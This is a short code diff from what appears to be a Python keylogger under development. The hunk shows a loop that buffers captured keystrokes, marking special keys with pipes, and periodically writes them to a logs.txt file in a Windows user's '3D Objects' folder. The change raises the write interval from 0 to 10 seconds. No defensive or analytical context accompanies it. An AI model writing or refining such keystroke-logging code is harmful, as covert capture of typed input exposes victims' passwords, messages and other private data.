@@ -29,7 +29,7 @@ while True:
                             key1 = f'|{key.upper()}|'
                 buff += key1
                 elapsed_time = time.time() - start_time
-                if elapsed_time >= 0.0:
+                if elapsed_time >= 10.0:
                     start_time = time.time()
                     with open('C:\\Users\\DELL\\3D Objects\\logs.txt', 'w') as f:
                         f.write(buff)
